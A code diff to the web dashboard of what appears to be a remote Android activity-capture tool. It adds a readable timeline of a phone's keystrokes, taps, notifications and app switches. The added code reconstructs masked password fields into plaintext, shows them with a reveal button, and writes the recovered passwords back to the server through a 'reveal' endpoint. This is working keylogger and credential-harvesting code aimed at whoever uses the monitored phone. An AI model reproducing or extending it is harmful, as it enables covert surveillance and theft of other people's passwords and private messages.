@@ -525,6 +525,126 @@
             font-size: 0.7rem;
         }
 
+        /* ── HUMAN VIEW ── */
+        .view-toggle {
+            display: inline-flex;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-left: auto;
+        }
+
+        .view-toggle button {
+            padding: 5px 12px;
+            background: var(--bg-panel);
+            border: none;
+            color: var(--text-muted);
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .view-toggle button.active {
+            background: rgba(0, 255, 65, 0.12);
+            color: var(--accent);
+        }
+
+        .view-toggle button:hover:not(.active) {
+            color: var(--text-primary);
+        }
+
+        .session-divider {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 9px 14px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(0, 200, 255, 0.04);
+        }
+
+        .session-divider .s-time {
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            white-space: nowrap;
+        }
+
+        .session-divider .s-app {
+            font-family: var(--font-display);
+            font-size: 0.62rem;
+            font-weight: 600;
+            color: #0cf;
+            letter-spacing: 0.5px;
+        }
+
+        .session-divider .s-stats {
+            font-family: var(--font-mono);
+            font-size: 0.52rem;
+            color: var(--text-muted);
+            white-space: nowrap;
+            margin-left: auto;
+        }
+
+        .human-tag-pw {
+            display: inline-block;
+            padding: 0 6px;
+            border-radius: 3px;
+            background: rgba(255, 60, 60, 0.1);
+            border: 1px solid rgba(255, 60, 60, 0.25);
+            color: #ff7a7a;
+            font-family: var(--font-display);
+            font-size: 0.52rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            vertical-align: middle;
+        }
+
+        .human-reveal {
+            color: #ffd166;
+        }
+
+        .human-reveal-note {
+            color: #888;
+            font-size: 0.55rem;
+        }
+
+        .human-typing .log-text {
+            color: #ffd166;
+        }
+
+        .reveal-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1px 5px;
+            margin: 0 4px;
+            background: rgba(255, 200, 60, 0.08);
+            border: 1px solid rgba(255, 200, 60, 0.2);
+            border-radius: 4px;
+            color: #ffd166;
+            cursor: pointer;
+            vertical-align: middle;
+            transition: all 0.15s;
+        }
+
+        .reveal-btn:hover {
+            background: rgba(255, 200, 60, 0.15);
+        }
+
+        .pw-text {
+            letter-spacing: 0.5px;
+            user-select: text;
+        }
+
+        .pw-text.blurred {
+            filter: blur(6px);
+            user-select: none;
+            cursor: pointer;
+        }
+
         /* ── EMPTY STATE ── */
         .empty {
             text-align: center;
@@ -978,6 +1098,7 @@
                 </div>
             </div>
             <div class="hdr-actions">
+                <span class="status-badge inactive" id="live-badge"><span>OFFLINE</span></span>
                 <span class="status-badge inactive" id="status-badge">
                     <span>STOPPED</span>
                 </span>
@@ -1044,8 +1165,16 @@
                 <option value="selection">Selections</option>
                 <option value="long_click">Long Clicks</option>
                 <option value="notification">Notifications</option>
+                <option value="text_selection">Text Selections</option>
+                <option value="schedule_start">Schedule Start</option>
+                <option value="schedule_stop">Schedule Stop</option>
+                <option value="announcement">Announcements</option>
             </select>
             <input type="text" id="filter-text" placeholder="Search text..." oninput="renderFeed()">
+            <div class="view-toggle">
+                <button id="btn-human" class="active" onclick="setViewMode('human')">Human</button>
+                <button id="btn-raw" onclick="setViewMode('raw')">Raw</button>
+            </div>
             <label class="auto-scroll-label">
                 <input type="checkbox" id="auto-scroll" checked> Auto-scroll
             </label>
@@ -1103,7 +1232,7 @@
     </div>
 
     <script src="/js/api.js"></script>
-    <script src="/js/call-notification.js"></script>
+    <script src="/js/password-reveal.js"></script>
     <script>
         lucide.createIcons();
 
@@ -1115,14 +1244,26 @@
         let wsConn = null;
         let installedApps = [];
         let scheduledApps = [];
+        let viewMode = 'human'; // 'human' = grouped readable timeline, 'raw' = one row per event
 
         // ===== LOAD CACHED EVENTS =====
         async function loadCachedEvents() {
             try {
-                const resp = await fetch('/api/device/' + deviceId + '/activities?limit=2000');
+                const resp = await fetch('/api/device/' + deviceId + '/activities?limit=5000');
                 const json = await resp.json();
-                if (json.success && json.events && json.events.length > 0) {
-                    allEvents = json.events;
+                if (json.success && json.events) {
+                    // Merge instead of replace so events that arrived live while the
+                    // fetch was in flight are not lost. Dedup by event uuid.
+                    const seen = new Set();
+                    const merged = [];
+                    json.events.concat(allEvents).forEach(e => {
+                        const id = e.uuid || (e.timestamp + ':' + (e.text || '') + ':' + (e.app || ''));
+                        if (seen.has(id)) return;
+                        seen.add(id);
+                        merged.push(e);
+                    });
+                    merged.sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
+                    allEvents = merged.slice(0, 5000);
                     updateStats();
                     renderFeed();
                 }
@@ -1135,20 +1276,26 @@
             try {
                 if (!isCapturing) {
                     const resp = await api.sendCommand(deviceId, 'activity_start', {});
-                    if (resp) {
+                    if (resp && resp.data && resp.data.status !== 'error') {
                         isCapturing = true;
                         btn.innerHTML = '<i data-lucide="pause" style="width:14px;height:14px;"></i> <span class="lbl">Stop</span>';
                         btn.classList.add('active');
                         updateStatusBadge(true);
                         lucide.createIcons();
+                    } else {
+                        api.showToast('Failed to start capture: ' + ((resp && resp.data && resp.data.message) || 'device error'), 'error');
                     }
                 } else {
                     const resp = await api.sendCommand(deviceId, 'activity_stop', {});
-                    isCapturing = false;
-                    btn.innerHTML = '<i data-lucide="play" style="width:14px;height:14px;"></i> <span class="lbl">Start</span>';
-                    btn.classList.remove('active');
-                    updateStatusBadge(false);
-                    lucide.createIcons();
+                    if (resp && resp.data && resp.data.status !== 'error') {
+                        isCapturing = false;
+                        btn.innerHTML = '<i data-lucide="play" style="width:14px;height:14px;"></i> <span class="lbl">Start</span>';
+                        btn.classList.remove('active');
+                        updateStatusBadge(false);
+                        lucide.createIcons();
+                    } else {
+                        api.showToast('Failed to stop capture: ' + ((resp && resp.data && resp.data.message) || 'device error'), 'error');
+                    }
                 }
             } catch (err) {
                 api.showToast('Error: ' + err.message, 'error');
@@ -1170,20 +1317,48 @@
         async function clearActivityLogs() {
             if (!confirm('Clear all activity data for this device?')) return;
             try {
-                await fetch('/api/device/' + deviceId + '/activities', {
+                const resp = await fetch('/api/device/' + deviceId + '/activities', {
                     method: 'DELETE',
                     headers: { 'X-CSRF-Token': api.csrfToken || '' },
                 });
-                allEvents = [];
-                updateStats();
-                renderFeed();
-            } catch (e) { /* ignore */ }
+                const d = await resp.json();
+                if (d && d.success) {
+                    allEvents = [];
+                    updateStats();
+                    renderFeed();
+                    api.showToast('Activity cleared', 'success');
+                } else {
+                    api.showToast('Failed to clear: ' + ((d && d.error) || 'unknown'), 'error');
+                }
+            } catch (e) {
+                api.showToast('Failed to clear: ' + e.message, 'error');
+            }
         }
 
         // ===== WEBSOCKET LIVE FEED =====
+        let renderTimer = null;
+        function scheduleRender() {
+            if (renderTimer) clearTimeout(renderTimer);
+            renderTimer = setTimeout(renderFeed, 250);
+        }
+
+        function updateLiveIndicator(state) {
+            const el = document.getElementById('live-badge');
+            if (!el) return;
+            const label = state === 'connected' ? 'LIVE' : state === 'connecting' ? 'CONNECTING' : 'OFFLINE';
+            el.className = state === 'connected' ? 'status-badge active-badge' : 'status-badge inactive';
+            el.innerHTML = (state === 'connected' ? '<span class="pulse-dot"></span>' : '') + '<span>' + label + '</span>';
+        }
+
         function connectWebSocket() {
             const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            updateLiveIndicator('connecting');
             wsConn = new WebSocket(proto + '//' + location.host);
+
+            wsConn.onopen = function () {
+                wsConn.send(JSON.stringify({ type: 'identify', role: 'browser' }));
+                updateLiveIndicator('connected');
+            };
 
             wsConn.onmessage = function (event) {
                 try {
@@ -1195,11 +1370,15 @@
                         });
                         if (allEvents.length > 5000) allEvents = allEvents.slice(0, 5000);
                         updateStats();
-                        renderFeed();
+                        scheduleRender();
                     }
 
                     if (data.type === 'active_state_sync' && data.deviceId === deviceId) {
                         const state = data.state;
+                        if (state && Array.isArray(state.scheduledApps)) {
+                            scheduledApps = state.scheduledApps;
+                            renderScheduledBadges();
+                        }
                         if (state && typeof state.isActivityActive !== 'undefined' && state.isActivityActive !== isCapturing) {
                             isCapturing = state.isActivityActive;
                             const btn = document.getElementById('btn-start');
@@ -1214,16 +1393,16 @@
                             lucide.createIcons();
                         }
                     }
-
-                    // Incoming call notification
-                    if (data.type === 'call_state' && typeof handleCallState === 'function') {
-                        handleCallState(data);
-                    }
-                } catch (e) { /* ignore */ }
+                    } catch (e) { /* ignore */ }
             };
 
             wsConn.onclose = function () {
+                updateLiveIndicator('offline');
                 setTimeout(connectWebSocket, 3000);
+            };
+            wsConn.onerror = function () {
+                updateLiveIndicator('offline');
+                try { wsConn.close(); } catch (e) { }
             };
         }
 
@@ -1241,6 +1420,369 @@
             document.getElementById('stat-total').textContent = allEvents.length;
         }
 
+        // ===== VIEW MODE =====
+        function setViewMode(mode) {
+            viewMode = mode;
+            document.getElementById('btn-human').classList.toggle('active', mode === 'human');
+            document.getElementById('btn-raw').classList.toggle('active', mode === 'raw');
+            renderFeed();
+        }
+
+        // ===== HUMANIZE (pure, no DOM) =====
+        const HUMAN_NOISE_PACKAGES = /honeyboard|inputmethod|android\.keyboard|android\.systemui|^android$/i;
+        const HUMAN_LABELS = {
+            text_changed: 'Typed',
+            click: 'Tapped',
+            long_click: 'Held',
+            scroll: 'Scrolled',
+            focus: 'Focused',
+            window_change: 'Opened',
+            app_switch: 'Opened',
+            notification: 'Notification',
+            selection: 'Selected',
+            text_selection: 'Selected text',
+            announcement: 'Read aloud',
+            schedule_start: 'Recording started',
+            schedule_stop: 'Recording stopped',
+        };
+        const HUMAN_LABEL_CLASS = {
+            'Typed': 'type-text_changed', 'Tapped': 'type-click', 'Held': 'type-long_click',
+            'Scrolled': 'type-scroll', 'Focused': 'type-focus', 'Opened': 'type-app_switch',
+            'Notification': 'type-notification', 'Selected': 'type-selection', 'Selected text': 'type-text_selection',
+            'Read aloud': 'type-announcement', 'Recording started': 'type-schedule_start', 'Recording stopped': 'type-schedule_stop',
+        };
+
+        function shortAppName(pkg) {
+            return pkg ? String(pkg).split('.').pop() : 'unknown';
+        }
+
+        function eventTime(ev) {
+            return Number(ev.timestamp) || (ev.receivedAt ? new Date(ev.receivedAt).getTime() : 0);
+        }
+
+        /**
+         * Turn raw machine events into a readable human timeline.
+         * - Filters keyboard/system noise (honeyboard, Gboard, android).
+         * - Collapses the ~25 raw rows per keystroke into one "typed" line.
+         * - Password fields end with the real text captured on the phone
+         *   (realText), since Android masks it in the raw event payload.
+         * - Splits the feed into sessions (app change / idle gap).
+         */
+        function humanizeEvents(events) {
+            const sorted = events.slice().sort((a, b) => eventTime(a) - eventTime(b));
+            const items = [];
+            const reveals = [];
+            const sessionStats = {};
+            let sessionId = 0;
+            let currentApp = '';
+            let burst = null;
+
+            function newSession(app, t) {
+                sessionId++;
+                sessionStats[sessionId] = { taps: 0, chars: 0, scrolls: 0, opens: 0, time: t, app: app || currentApp };
+            }
+
+            function closeBurst(persist) {
+                if (!burst) return;
+                const lastEv = burst.events[burst.events.length - 1] || {};
+                let reveal = null;
+                let detail;
+                if (burst.password) {
+                    // Prefer the value already persisted in the DB (authoritative),
+                    // otherwise reconstruct the real text from this burst's snapshots.
+                    let text = '';
+                    let partial = false;
+                    let reason = null;
+                    if (lastEv.textRevealed) {
+                        text = lastEv.textRevealed;
+                        partial = !!lastEv.revealPartial;
+                    } else {
+                        const rec = window.PasswordReveal.reconstructPassword(burst.events);
+                        text = rec.text;
+                        partial = rec.partial;
+                        reason = rec.reason;
+                    }
+                    if (text) {
+                        reveal = { uuid: lastEv.uuid || '', text: text, partial: partial, reason: reason };
+                        detail = 'typed password <span class="human-tag-pw">PASSWORD</span> ' +
+                            '<button class="reveal-btn" onclick="toggleReveal(this)" title="Reveal password"><i data-lucide="eye" style="width:12px;height:12px;"></i></button> ' +
+                            '<span class="pw-text blurred">&ldquo;' + escHtml(text) + '&rdquo;</span>' +
+                            (partial ? ' <span class="human-reveal-note">(partial' + (reason ? ': ' + escHtml(reason) : '') + ')</span>' : '');
+                    } else {
+                        detail = 'typed a password <span class="human-tag-pw">PASSWORD</span> <span class="human-reveal-note">(characters hidden by this Android build)</span>';
+                    }
+                } else {
+                    const value = burst.lastText || burst.lastReal || '';
+                    if (value) {
+                        detail = 'typed <span class="human-reveal">&ldquo;' + escHtml(value) + '&rdquo;</span>';
+                    } else {
+                        detail = 'typed text';
+                    }
+                    if (burst.contentDesc) {
+                        detail += ' <span class="human-reveal-note">in &ldquo;' + escHtml(burst.contentDesc) + '&rdquo;</span>';
+                    }
+                }
+                items.push({
+                    kind: 'event', cls: 'human-typing', sessionId: burst.sessionId,
+                    time: burst.time, app: burst.app, appName: shortAppName(burst.app),
+                    label: 'Typed', detail: detail, eventTypes: ['text_changed'],
+                    searchText: (burst.lastText || burst.lastReal || '').toLowerCase(),
+                });
+                if (persist && reveal && reveal.uuid) reveals.push(reveal);
+                const st = sessionStats[burst.sessionId];
+                if (st) st.chars += Math.max((burst.lastText || '').length, (burst.lastReal || '').length);
+                burst = null;
+            }
+
+            function pushBumpEvent(ev, label, detail, eventTypes, searchText, cls) {
+                items.push({
+                    kind: 'event', cls: cls || 'type-app_switch', sessionId,
+                    time: eventTime(ev), app: ev.app || '', appName: shortAppName(ev.app || ''),
+                    label: label, detail: detail, eventTypes: eventTypes, searchText: searchText,
+                });
+            }
+
+            for (const ev of sorted) {
+                const pkg = ev.app || '';
+                if (HUMAN_NOISE_PACKAGES.test(pkg)) continue;
+                const evType = ev.type || 'other';
+                const t = eventTime(ev);
+                const appShort = shortAppName(pkg);
+                const lastItem = items[items.length - 1];
+
+                // Idle gap > 2 min → new session
+                if (lastItem && (t - lastItem.time) > 120000) {
+                    closeBurst(true);
+                    newSession(pkg, t);
+                }
+                if (!sessionStats[sessionId]) newSession(pkg, t);
+
+                if (evType === 'text_changed') {
+                    if (burst) {
+                        const fieldChanged = (burst.className && ev.className && burst.className !== ev.className) ||
+                            ((burst.contentDesc || ev.contentDesc) && burst.contentDesc !== (ev.contentDesc || ''));
+                        if (fieldChanged || (t - burst.time) > 2500) closeBurst(true);
+                    }
+                    if (!burst) {
+                        burst = { sessionId: sessionId, time: t, app: pkg, password: !!ev.isPassword, lastText: '', lastReal: '', className: ev.className, contentDesc: ev.contentDesc || '', events: [] };
+                    } else {
+                        burst.time = t;
+                        burst.password = burst.password || !!ev.isPassword;
+                    }
+                    // Password fallback: the shipped app doesn't set isPassword yet,
+                    // so treat bullet-masked snapshots (••••j) as a password field.
+                    burst.password = burst.password || window.PasswordReveal.isMasked(ev.text || ev.realText);
+                    burst.events.push(ev);
+                    if (ev.text) burst.lastText = ev.text;
+                    if (ev.realText) burst.lastReal = ev.realText;
+                    if (ev.contentDesc) burst.contentDesc = ev.contentDesc;
+                    continue;
+                }
+
+                closeBurst(true);
+
+                if (evType === 'app_switch') {
+                    newSession(pkg, t);
+                    currentApp = pkg;
+                    pushBumpEvent(ev, 'Opened',
+                        'Opened <b>' + escHtml(ev.appName || appShort) + '</b>' +
+                        (ev.previousApp ? ' <span class="human-reveal-note">from ' + escHtml(shortAppName(ev.previousApp)) + '</span>' : ''),
+                        ['app_switch'], ((ev.appName || '') + ' ' + pkg).toLowerCase());
+                    sessionStats[sessionId].opens++;
+                    continue;
+                }
+
+                if (evType === 'window_change') {
+                    if (pkg && pkg !== currentApp) {
+                        newSession(pkg, t);
+                        currentApp = pkg;
+                        pushBumpEvent(ev, 'Opened', 'Opened <b>' + escHtml(appShort) + '</b>', ['window_change'], pkg.toLowerCase());
+                        sessionStats[sessionId].opens++;
+                    }
+                    continue;
+                }
+
+                if (evType === 'schedule_start' || evType === 'schedule_stop') {
+                    newSession(pkg, t);
+                    pushBumpEvent(ev, HUMAN_LABELS[evType] || evType,
+                        escHtml(ev.text || (evType === 'schedule_start' ? 'Recording started' : 'Recording stopped')),
+                        [evType], '', evType);
+                    continue;
+                }
+
+                if (evType === 'click' || evType === 'long_click') {
+                    const widget = ev.className ? ev.className.split('.').pop() : '';
+                    const label = evType === 'long_click' ? 'Held' : 'Tapped';
+                    const what = ev.text || ev.contentDesc || widget || 'button';
+                    items.push({
+                        kind: 'event', cls: 'type-click', sessionId, time: t, app: pkg, appName: appShort,
+                        label: label,
+                        detail: label + ' <b>' + escHtml(what) + '</b>' +
+                            (widget && !ev.text && !ev.contentDesc ? ' <span class="human-reveal-note">[' + escHtml(widget) + ']</span>' : ''),
+                        eventTypes: [evType], searchText: String(what).toLowerCase(),
+                    });
+                    sessionStats[sessionId].taps++;
+                    continue;
+                }
+
+                if (evType === 'scroll') {
+                    const maxY = Number(ev.maxScrollY || 0);
+                    const pct = maxY > 0 ? Math.round((Number(ev.scrollY || 0) / maxY) * 100) : null;
+                    items.push({
+                        kind: 'event', cls: 'type-scroll', sessionId, time: t, app: pkg, appName: appShort,
+                        label: 'Scrolled',
+                        detail: 'Scrolled' + (pct != null ? ' to <b>' + pct + '%</b>' : '') +
+                            (ev.itemCount ? ' <span class="human-reveal-note">' + ev.itemCount + ' items</span>' : ''),
+                        eventTypes: ['scroll'], searchText: 'scroll',
+                    });
+                    sessionStats[sessionId].scrolls++;
+                    continue;
+                }
+
+                if (evType === 'focus') {
+                    const what = ev.text || ev.contentDesc || (ev.className ? ev.className.split('.').pop() : 'field');
+                    items.push({
+                        kind: 'event', cls: 'type-focus', sessionId, time: t, app: pkg, appName: appShort,
+                        label: 'Focused', detail: 'Focused <b>' + escHtml(what) + '</b>',
+                        eventTypes: ['focus'], searchText: String(what).toLowerCase(),
+                    });
+                    continue;
+                }
+
+                if (evType === 'notification') {
+                    items.push({
+                        kind: 'event', cls: 'type-notification', sessionId, time: t, app: pkg, appName: appShort,
+                        label: 'Notification', detail: 'Notification: <b>' + escHtml(ev.text || ev.contentDesc || '') + '</b>',
+                        eventTypes: ['notification'], searchText: ((ev.text || '') + ' ' + (ev.contentDesc || '')).toLowerCase(),
+                    });
+                    continue;
+                }
+
+                if (evType === 'announcement') {
+                    items.push({
+                        kind: 'event', cls: 'type-announcement', sessionId, time: t, app: pkg, appName: appShort,
+                        label: 'Read aloud', detail: 'Read aloud: ' + escHtml(ev.text || ''),
+                        eventTypes: ['announcement'], searchText: (ev.text || '').toLowerCase(),
+                    });
+                    continue;
+                }
+
+                if (evType === 'selection' || evType === 'text_selection') {
+                    if (ev.text) {
+                        items.push({
+                            kind: 'event', cls: 'type-selection', sessionId, time: t, app: pkg, appName: appShort,
+                            label: 'Selected', detail: 'Selected <b>' + escHtml(ev.text) + '</b>',
+                            eventTypes: [evType], searchText: ev.text.toLowerCase(),
+                        });
+                    }
+                    continue;
+                }
+
+                // content_change and other_* → keyboard/layout noise, skipped in human view
+            }
+            closeBurst(false);
+
+            items.reverse(); // newest first for display
+            return { items: items, sessionStats: sessionStats, reveals: reveals };
+        }
+
+        function fmtTime(ts) {
+            return ts ? new Date(ts).toLocaleTimeString() : '--';
+        }
+
+        function renderHuman(container, events, typeFilter, textFilter) {
+            const human = humanizeEvents(events);
+
+            let display = human.items;
+            if (typeFilter !== 'all') {
+                display = display.filter(it => it.eventTypes.indexOf(typeFilter) >= 0);
+            }
+            if (textFilter) {
+                display = display.filter(it => (it.searchText || '').indexOf(textFilter) >= 0);
+            }
+
+            if (display.length === 0) {
+                container.innerHTML = '<div class="empty"><div class="e-icon"><i data-lucide="list" style="width:48px;height:48px;"></i></div>' +
+                    '<h2>Nothing to show here</h2>' +
+                    '<p>Switch to Raw to see every machine event (noise is collapsed in Human view).</p></div>';
+                lucide.createIcons();
+                return;
+            }
+
+            let html = '';
+            let lastSession = null;
+            display.slice(0, 1000).forEach(function (it) {
+                if (it.sessionId !== lastSession) {
+                    const st = human.sessionStats[it.sessionId];
+                    const appName = (st && st.app) ? shortAppName(st.app) : (it.appName || 'unknown');
+                    const parts = [];
+                    if (st && st.opens) parts.push(st.opens + ' opened');
+                    if (st && st.taps) parts.push(st.taps + ' taps');
+                    if (st && st.chars) parts.push(st.chars + ' chars typed');
+                    if (st && st.scrolls) parts.push(st.scrolls + ' scrolls');
+                    html += '<div class="session-divider">' +
+                        '<span class="s-time">' + fmtTime(st ? st.time : it.time) + '</span>' +
+                        '<span class="s-app">' + escHtml(appName) + '</span>' +
+                        '<span class="s-stats">' + (parts.length ? parts.join(' &middot; ') : '') + '</span>' +
+                        '</div>';
+                    lastSession = it.sessionId;
+                }
+                html += '<div class="log-entry ' + (it.cls || '') + '">' +
+                    '<span class="log-time">' + fmtTime(it.time) + '</span>' +
+                    '<span class="log-type ' + (HUMAN_LABEL_CLASS[it.label] || 'type-other') + '">' + escHtml((it.label || '').toUpperCase()) + '</span>' +
+                    '<span class="log-app" title="' + escHtml(it.app || '') + '">' + escHtml(it.appName) + '</span>' +
+                    '<span class="log-text">' + (it.detail || '<span style="color:#333;">—</span>') + '</span>' +
+                    '</div>';
+            });
+
+            container.innerHTML = html;
+            lucide.createIcons();
+            if (human.reveals) {
+                human.reveals.forEach(function (r) { queueReveal(r.uuid, r.text, r.partial, r.reason); });
+            }
+            if (document.getElementById('auto-scroll').checked) {
+                container.scrollTop = 0;
+            }
+        }
+
+        // ===== PASSWORD REVEAL PERSISTENCE =====
+        // Reconstructed passwords are written back to Supabase so the unmasked
+        // text survives page reloads and other consumers (best-effort; a failed
+        // POST just recomputes on the next render).
+        let revealPushed = new Set();
+        let revealQueue = [];
+        let revealTimer = null;
+
+        function queueReveal(uuid, text, partial, reason) {
+            if (!uuid || !text || revealPushed.has(uuid)) return;
+            revealPushed.add(uuid);
+            revealQueue.push({ uuid: uuid, text: text, partial: !!partial });
+            if (revealTimer) clearTimeout(revealTimer);
+            revealTimer = setTimeout(flushReveals, 400);
+        }
+
+        async function flushReveals() {
+            if (!revealQueue.length) return;
+            const batch = revealQueue;
+            revealQueue = [];
+            try {
+                await fetch('/api/device/' + deviceId + '/activities/reveal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': api.csrfToken || '' },
+                    body: JSON.stringify({ updates: batch }),
+                    credentials: 'same-origin',
+                });
+            } catch (e) { /* best-effort: recomputed from events on next render */ }
+        }
+
+        function toggleReveal(btn) {
+            const textEl = btn.parentElement.querySelector('.pw-text');
+            if (!textEl) return;
+            const blurred = textEl.classList.toggle('blurred');
+            btn.innerHTML = '<i data-lucide="' + (blurred ? 'eye' : 'eye-off') + '" style="width:12px;height:12px;"></i>';
+            if (window.lucide) lucide.createIcons();
+        }
+
         // ===== RENDER FEED =====
         function renderFeed() {
             const container = document.getElementById('feed');
@@ -1255,6 +1797,7 @@
             if (textFilter) {
                 filtered = filtered.filter(e =>
                     (e.text || '').toLowerCase().includes(textFilter) ||
+                    (e.realText || '').toLowerCase().includes(textFilter) ||
                     (e.contentDesc || '').toLowerCase().includes(textFilter) ||
                     (e.app || '').toLowerCase().includes(textFilter)
                 );
@@ -1263,8 +1806,13 @@
             if (filtered.length === 0) {
                 container.innerHTML = '<div class="empty"><div class="e-icon"><i data-lucide="keyboard" style="width:48px;height:48px;"></i></div>' +
                     '<h2>No activity captured</h2>' +
-                    '<p>Start activity capture to see raw events here. Every text change, click, scroll will appear.</p></div>';
+                    '<p>Start activity capture to see events here. Every text change, click, scroll will appear.</p></div>';
                 lucide.createIcons();
+                return;
+            }
+
+            if (viewMode === 'human') {
+                renderHuman(container, filtered, typeFilter, textFilter);
                 return;
             }
 
@@ -1300,11 +1848,6 @@
                 if (evType === 'app_switch') {
                     textDisplay = '<span style="font-weight:bold;">' + escHtml(ev.text || ev.appName || appName) + '</span>';
                     if (ev.previousApp) textDisplay += ' <span style="color:#555;font-size:9px;">from ' + escHtml(ev.previousApp.split('.').pop()) + '</span>';
-                }
-
-                const hasDots = (ev.text || '').includes('\u2022') || (ev.text || '').includes('\u25CF');
-                if (hasDots) {
-                    textDisplay = '🔒 ' + textDisplay;
                 }
 
                 html += '<div class="log-entry">' +
@@ -1378,8 +1921,8 @@
                 const pkg = a.package || a.packageName || '';
                 const name = a.name || pkg.split('.').pop();
                 const checked = scheduledApps.includes(pkg);
-                html += '<div class="app-item' + (checked ? ' selected' : '') + '" onclick="toggleApp(\'' + escHtml(pkg) + '\', this)">' +
-                    '<input type="checkbox" ' + (checked ? 'checked' : '') + ' onclick="event.stopPropagation(); toggleApp(\'' + escHtml(pkg) + '\', this.parentElement)">' +
+                html += '<div class="app-item' + (checked ? ' selected' : '') + '" onclick="toggleApp(\'' + escJs(pkg) + '\', this)">' +
+                    '<input type="checkbox" ' + (checked ? 'checked' : '') + ' onclick="event.stopPropagation(); toggleApp(\'' + escJs(pkg) + '\', this.parentElement)">' +
                     '<div style="flex:1"><div class="app-name">' + escHtml(name) + '</div>' +
                     '<div class="app-pkg">' + escHtml(pkg) + '</div></div></div>';
             });
@@ -1449,7 +1992,7 @@
             scheduledApps.forEach(pkg => {
                 const name = pkg.split('.').pop();
                 html += '<span class="scheduled-badge">' + escHtml(name) +
-                    ' <span class="remove-badge" onclick="removeScheduledApp(\'' + escHtml(pkg) + '\')">&times;</span></span>';
+                    ' <span class="remove-badge" onclick="removeScheduledApp(\'' + escJs(pkg) + '\')">&times;</span></span>';
             });
             container.innerHTML = html;
         }
@@ -1488,7 +2031,10 @@
         connectWebSocket();
 
         // ===== Page Leave Cleanup =====
+        let leftOnce = false;
         function cleanupOnLeave() {
+            if (leftOnce) return;
+            leftOnce = true;
             if (isCapturing) {
                 // sendBeacon cannot send the X-CSRF-Token header, so the server
                 // always rejects it (403) and capture would keep running.
